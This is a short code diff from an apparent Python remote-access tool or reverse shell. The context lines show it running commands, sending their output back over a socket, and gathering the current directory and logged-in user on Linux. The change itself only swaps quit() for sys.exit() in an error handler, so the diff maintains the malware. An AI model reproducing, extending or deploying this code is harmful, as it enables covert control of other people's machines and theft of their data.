@@ -77,7 +77,7 @@ def main():
                                 output = p.stdout.read()
                                 self.csocket.send(bytes(output))
                             except ConnectionAbortedError:
-                                quit()
+                                sys.exit()
                     elif sys.platform.startswith('linux'):
                         curDir = os.getcwd()
                         curUser = os.getlogin()
